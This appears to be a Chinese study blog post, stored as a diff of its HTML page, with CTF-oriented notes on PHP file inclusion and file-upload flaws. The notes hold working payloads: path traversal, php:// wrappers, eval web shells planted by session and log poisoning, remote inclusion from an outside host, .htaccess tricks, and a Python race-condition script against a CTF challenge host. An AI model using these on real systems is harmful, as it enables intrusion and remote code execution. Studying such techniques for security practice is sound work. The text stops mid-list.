@@ -1,0 +1,1005 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="夏饭orz">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="夏饭orz">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="冒险者，欢迎光临🌹">
+    <meta name="description" content="文件包含常见函数： include&#x2F;include_once(出错发警告) require&#x2F;require_once(出错直接退出)可以读取文件内容或者执行代码  漏洞利用：本地文件包含漏洞1234&lt;?php	$file&#x3D;$_GET[&#x27;file&#x27;];	include ($file);?&gt; file&#x3D;..&#x2F;..&#x2F;..&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含&amp;文件上传(主php)">
+<meta property="og:url" content="http://example.com/2025/06/22/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="夏饭の小饭堂">
+<meta property="og:description" content="文件包含常见函数： include&#x2F;include_once(出错发警告) require&#x2F;require_once(出错直接退出)可以读取文件内容或者执行代码  漏洞利用：本地文件包含漏洞1234&lt;?php	$file&#x3D;$_GET[&#x27;file&#x27;];	include ($file);?&gt; file&#x3D;..&#x2F;..&#x2F;..&amp;">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/..%5Cimages%5Ca01af52b7d1925b10adc1a52c3448fb.png">
+<meta property="article:published_time" content="2025-06-22T06:30:00.000Z">
+<meta property="article:modified_time" content="2025-06-22T14:33:09.292Z">
+<meta property="article:author" content="夏饭orz">
+<meta property="article:tag" content="web漏洞">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/..%5Cimages%5Ca01af52b7d1925b10adc1a52c3448fb.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/taco-truck.png">
+    <title>文件包含&amp;文件上传(主php) · 夏饭の小饭堂</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">夏饭の小饭堂.</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">夏饭の小饭堂.</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">文件包含&文件上传(主php)</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/54_i12.png)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                文件包含&文件上传(主php)
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="web漏洞">web漏洞</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="php">php</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/06/22</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="常见函数："><a href="#常见函数：" class="headerlink" title="常见函数："></a>常见函数：</h2><ul>
+<li>include&#x2F;include_once(出错发警告)</li>
+<li>require&#x2F;require_once(出错直接退出)<br>可以读取文件内容或者执行代码</li>
+</ul>
+<h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><h3 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">include</span> (<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd(获取文件内容)<br>file&#x3D;phpinfo.txt(<?phpinfo();?>)<br>file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('ls');?><br>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<h3 id="session条件竞争"><a href="#session条件竞争" class="headerlink" title="session条件竞争"></a>session条件竞争</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[file];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>条件：</p>
+<p> session.upload_progress.enabled &#x3D; on:该参数设置为On时，才会进行<strong>文件上传进度</strong>的记录。</p>
+<p> session.upload_progress.cleanup &#x3D; on:该参数开启时，会在文件上传结束时对用户session内容进行自动清除。</p>
+<p> session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS”:    该参数与prefix作为我们的键名。方便我们的shell编写，可控。</p>
+<p> session.upload_progress.prefix &#x3D; “upload_progress_”:该参数表示与name一起构成我们的键名。</p>
+</li>
+<li><p>攻击步骤：</p>
+<ul>
+<li>post模拟文件上传，从而达到shell写入的目的</li>
+</ul>
+<blockquote>
+<p>cookie &#x3D; {‘PHPSESSID’:sessid},<br>&#x2F;&#x2F;生成文件名为sess_sessid<br>data &#x3D; {“PHP_SESSION_UPLOAD_PROGRESS”:”<?php eval($_POST[1]);?>“}<br>&#x2F;&#x2F;写入文件后为 upload_progress _ <?php eval($_POST[1]);?><br>files &#x3D; {‘file’:(‘k1he.txt’,f)}<br>&#x2F;&#x2F;会显示再session文件中，可以作为成功上传的凭证</p>
+</blockquote>
+<ul>
+<li>再转移到session文件目录，读取页面<blockquote>
+<p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;<br>&#x2F;tmp&#x2F;<br>&#x2F;tmp&#x2F;sessions&#x2F;<br>&#x2F;&#x2F;常见session文件目录</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p>脚本：</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-08-23 18:08:10</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-08-23 20:19:18</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;k1he&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://a0c9ce43-6c4d-4b28-aa61-1c7a6eb40879.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>* <span class="number">1024</span> * <span class="number">50</span>)                     <span class="comment">#创建文件</span></span><br><span class="line">        response = session.post(                            <span class="comment">#post文件上传</span></span><br><span class="line">            url,                                            <span class="comment">#url</span></span><br><span class="line">            cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,                   <span class="comment">#设置cookie为我们的sessid</span></span><br><span class="line">            data = &#123; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat *fl0g.php&#x27;);?&gt;&quot;</span>&#125;,<span class="comment">#写马或执行内容</span></span><br><span class="line">            files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;k1he.txt&#x27;</span>,f)&#125;                 <span class="comment">#上传文的具体内容，文件名和文件内容</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        payload = <span class="string">&quot;?file=/tmp/sess_&quot;</span>+sessid                 <span class="comment">#包含我们的session路径</span></span><br><span class="line"></span><br><span class="line">        response = session.get(url = url+payload)           <span class="comment">#读取页面</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;k1he.txt&#x27;</span> <span class="keyword">in</span> response.text:                     <span class="comment">#返回页面</span></span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]retrying!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:                                  </span><br><span class="line"><span class="comment">#一直上传，且双线程运行,使得内容来不及被删除</span></span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="中间件日志文件包含"><a href="#中间件日志文件包含" class="headerlink" title="中间件日志文件包含"></a>中间件日志文件包含</h3><ol>
+<li><p>条件：<br>web中间件日志文件的存储位置已知，并且具有可读权限(&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log)</p>
+</li>
+<li><p>攻击步骤：</p>
+<ul>
+<li>访问<a target="_blank" rel="noopener" href="http://www.abc.com/xxx/">http://www.abc.com/xxx/</a><?php @eval($_POST[123]);?>或者改ua头<br>(将恶意代码写入到日志文件，日志文件会记录访问者的各种信息)</li>
+<li>访问<a target="_blank" rel="noopener" href="http://www.abc.com/xxx/file.php?file=../../../var/log/httpd/access_log">http://www.abc.com/xxx/file.php?file=../../../var/log/httpd/access_log</a> (文件包含日志文件)&amp;123&#x3D;system(‘tac fl0g.php’);phpinfo();</li>
+</ul>
+</li>
+</ol>
+<h3 id="SSH日志文件包含"><a href="#SSH日志文件包含" class="headerlink" title="SSH日志文件包含"></a>SSH日志文件包含</h3><ol>
+<li><p>条件：<br>SSH日志路径已知，并且具有可读权限(&#x2F;var&#x2F;log&#x2F;auth.log)</p>
+</li>
+<li><p>攻击步骤：</p>
+<ul>
+<li>ssh “<?php @eval($_POST[123]);?>“@192.168.1.1</li>
+<li><a target="_blank" rel="noopener" href="http://192.168.1.1/xxx/file.php?file=../../../var/log/auth.log">http://192.168.1.1/xxx/file.php?file=../../../var/log/auth.log</a></li>
+</ul>
+</li>
+</ol>
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><ol>
+<li>条件：<br>allow_url_fopen&#x3D;on<br>allow_url_include&#x3D;on</li>
+<li>攻击步骤：<ul>
+<li>?file&#x3D;<a target="_blank" rel="noopener" href="http://192.168.2.1/php.txt">http://192.168.2.1/php.txt</a></li>
+</ul>
+</li>
+</ol>
+<h2 id="常见敏感文件："><a href="#常见敏感文件：" class="headerlink" title="常见敏感文件："></a>常见敏感文件：</h2><ul>
+<li>windows：<table>
+<thead>
+<tr>
+<th align="center">目录</th>
+<th align="center">内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">\boot.ini</td>
+<td align="center">系统版本信息</td>
+</tr>
+<tr>
+<td align="center">\xxx\php.ini</td>
+<td align="center">PHP配置信息</td>
+</tr>
+<tr>
+<td align="center">\xxx\my.ini</td>
+<td align="center">MYSQL配置信息</td>
+</tr>
+<tr>
+<td align="center">\xxx\httpd.conf、</td>
+<td align="center">Apache配置信息</td>
+</tr>
+</tbody></table>
+</li>
+<li>linux:<table>
+<thead>
+<tr>
+<th align="center">目录</th>
+<th align="center">内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">&#x2F;etc&#x2F;passwd</td>
+<td align="center">Linux系统账号信息</td>
+</tr>
+<tr>
+<td align="center">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</td>
+<td align="center">Apache配置信息</td>
+</tr>
+<tr>
+<td align="center">&#x2F;etc&#x2F;my.conf</td>
+<td align="center">MySQL配置信息</td>
+</tr>
+<tr>
+<td align="center">&#x2F;usr&#x2F;etc&#x2F;php.ini</td>
+<td align="center">PHP配置信息</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<h2 id="php伪协议："><a href="#php伪协议：" class="headerlink" title="php伪协议："></a>php伪协议：</h2><p>文件操纵函数&#x2F;处理流数据的函数(文件路径&#x2F;url)</p>
+<ul>
+<li><p>php:&#x2F;&#x2F;伪协议：</p>
+<ol>
+<li><p>php:&#x2F;&#x2F;filter(对本地磁盘文件进行读写)</p>
+<ul>
+<li><p>filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p>
+</li>
+<li><p>?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p>
+</li>
+</ul>
+</li>
+<li><p>php:&#x2F;&#x2F;input(post传入什么就回显什么)</p>
+<ul>
+<li><p>echo file_get_contents(“php:&#x2F;&#x2F;input”);  </p>
+</li>
+<li><p>http”&#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://www.abc.com/xxx/file.php?file=php://input">www.abc.com/xxx/file.php?file=php://input</a><br>&amp; post传入<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>‘);?&gt;</p>
+</li>
+<li><p>http”&#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://www.abc.com/xxx/file.php?file=php://input">www.abc.com/xxx/file.php?file=php://input</a><br>&amp; post传入<?php system('ls');?></p>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><p>file: &#x2F;&#x2F;伪协议(可以访问本地文件系统，读取本地文件的内容)<br>  ?file&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;boot.ini</p>
+</li>
+<li><p>data:&#x2F;&#x2F; 伪协议(数据流的读取)<br>  data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxxx(base64编码后的数据，需要对加号进行URL编码：%2b)<br>  data:&#x2F;&#x2F;text&#x2F;plain,<?php system('ls');?></p>
+</li>
+<li><p>phar:&#x2F;&#x2F;伪协议(解压的伪协议)<br>  ?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;压缩文件<br>  ?file&#x3D;phar:&#x2F;&#x2F;shell.png&#x2F;shell.php (png当做zip压缩包进行解压，并且访问解压后的shell.php文件)</p>
+</li>
+</ul>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><h3 id="前端js校验："><a href="#前端js校验：" class="headerlink" title="前端js校验："></a>前端js校验：</h3><ul>
+<li>在console中，破坏函数&#x2F;修改js添加白名单&#x2F;删除js黑名单</li>
+<li>使用浏览器插件禁用js</li>
+</ul>
+<h3 id="检查后缀："><a href="#检查后缀：" class="headerlink" title="检查后缀："></a>检查后缀：</h3><hr>
+<h4 id=""><a href="#" class="headerlink" title="&lt;**黑名单**&gt;"></a>&lt;**黑名单**&gt;</h4><h5 id="user-ini："><a href="#user-ini：" class="headerlink" title=".user.ini："></a>.user.ini：</h5><ul>
+<li><p>条件：同目录下有要执行的php文件,用蚁剑链接的时候注意路径正确(url&#x2F;upload&#x2F;index.php)</p>
+</li>
+<li><p>上传.user.ini,写入:</p>
+<p>​    auto_append_file &#x3D; 1.txt(包含在文件尾)</p>
+<p>​    auto_prepend_file &#x3D; 1.txt&#x2F;url(包含在文件头)</p>
+<p>将1.txt包含到要执行的php文件中,使得在执行php文件同时执行1.txt，相当于文件包含，还可以包含远程文件</p>
+</li>
+</ul>
+<h5 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess:"></a>.htaccess:</h5><ul>
+<li><p>条件：apache 服务器</p>
+</li>
+<li><p>上传.htaccess文件，写入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;webshell.jpg&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">    <span class="comment">//对当前目录下的webshell.jpg执行php解析</span></span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">    </span><br><span class="line">AddType application/x-httpd-php .gif</span><br><span class="line"><span class="comment">//.gif后缀文件当作php解析</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果使用<code>exif_imagetype</code>检测上传的文件的第一个字节来判断文件类型，那么只要是图像格式以<code>#</code>或<code>0x00</code>开头便可绕过</p>
